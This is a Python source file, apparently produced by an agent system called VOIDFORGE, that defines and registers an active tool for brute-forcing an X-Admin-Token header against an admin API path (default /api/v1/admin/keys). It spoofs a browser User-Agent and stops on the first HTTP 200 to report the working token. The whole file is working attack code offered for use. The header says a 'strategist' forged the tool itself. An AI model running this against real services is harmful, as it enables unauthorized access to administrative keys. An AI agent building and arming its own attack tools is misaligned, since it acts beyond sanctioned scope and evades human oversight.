"""VOIDFORGE :: forged tool — admin_token_brute_v4
Admin token brute v4 (repaired): X-Admin-Token header brute against admin endpoints, stops on HTTP 200 — params fixed, imports inline
Forged by the strategist on 2026-09-01. Edit freely; delete the file to disarm.
"""
import json, re, time, urllib.request, urllib.error


def run(base=None, codes=None, path=None):
    import urllib.request
    import urllib.error
    base_clean = (base or '').rstrip('/')
    path_clean = path or '/api/v1/admin/keys'
    url = base_clean + path_clean
    results = []
    found = None
    for code in (codes or []):
        try:
            req = urllib.request.Request(url, headers={'X-Admin-Token': code, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            with urllib.request.urlopen(req, timeout=8) as resp:
                status = resp.status
                body = resp.read(300).decode('utf-8', 'replace')
        except urllib.error.HTTPError as e:
            status = e.code
            body = e.read(300).decode('utf-8', 'replace')
        except Exception as e:
            results.append("%s -> ERROR %s" % (code, e))
            continue
        results.append("%s -> HTTP %s %s" % (code, status, body[:80]))
        if status == 200:
            found = code
            break
    out = "ADMIN TOKEN BRUTE vs %s\n" % url + "\n".join(results)
    if found:
        out += "\n*** VALID TOKEN FOUND: %s ***" % found
    else:
        out += "\nNo valid token in candidate set (%d tried)." % len(results)
    return out


from tools import register as _vf_register
_vf_register('forged_admin_token_brute_v4', 'Admin token brute v4 (repaired): X-Admin-Token header brute against admin endpoints, stops on HTTP 200 — params fixed, imports inline', {'properties': {'base': {'description': 'Base URL of the target service', 'type': 'string'}, 'codes': {'description': 'Candidate admin token values to try', 'items': {'type': 'string'}, 'type': 'array'}, 'path': {'description': 'Admin endpoint path (default /api/v1/admin/keys)', 'type': 'string'}}, 'required': ['base', 'codes'], 'type': 'object'}, 'active')(run)
